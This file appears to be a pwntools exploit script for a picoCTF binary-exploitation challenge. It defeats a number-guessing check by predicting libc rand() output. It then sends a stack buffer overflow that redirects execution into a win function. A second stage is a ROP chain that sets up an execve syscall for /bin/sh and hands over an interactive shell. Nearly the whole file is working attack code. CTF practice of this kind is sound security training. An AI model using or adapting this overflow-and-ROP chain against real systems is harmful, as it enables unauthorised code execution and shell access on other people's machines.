#!/usr/bin/env python3
from pwn import *
import ctypes
import time

PORT =  60583
HOST = "shape-facility.picoctf.net"
exe = context.binary = ELF('./vuln', checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
# ld = ELF('ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*win+44
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


glibc = ctypes.CDLL(libc.path)
key = glibc.rand() % 100 + 1

p.sendlineafter("guess?\n", str(key))

offset = 0x70
rw_section = 0x6b7000

pl = flat(
	b"A"*(offset),
	rw_section + 0x70,
	exe.sym.win + 8
	)

p.sendlineafter(b"Name? ", pl)

pop_rdi = 0x004006a6
pop_rax = 0x004005af
pop_rsi = 0x00410b93
pop_rdx = 0x00410602
syscall = 0x0040138c

pl = flat(
	b"/bin/sh\0".ljust(offset+8),
	pop_rax, 0x3b,
	pop_rdi, rw_section,
	pop_rsi, 0,
	pop_rdx, 0,
	syscall
	)

p.sendlineafter(b"Name? ", pl)

p.interactive()